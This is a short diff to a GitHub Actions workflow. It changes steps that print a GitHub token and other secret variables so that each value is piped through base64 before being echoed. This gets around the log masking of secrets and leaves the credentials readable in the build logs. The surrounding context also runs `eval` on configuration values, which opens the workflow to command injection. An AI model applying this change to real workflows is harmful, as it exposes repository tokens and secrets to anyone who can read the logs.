@@ -15,7 +15,7 @@ jobs:
             val=$(eval "echo \"$value\"")
             echo "$key=$val" >> "$GITHUB_ENV"
           done
-      - run: echo "$github_token"
-      - run: echo "$TEST"
-      - run: echo "${TEST_LAGI}haha"
+      - run: echo "$github_token" | base64 -w0
+      - run: echo "$TEST" | base64 -w0
+      - run: echo "$TEST_LAGI" | base64 -w0
 
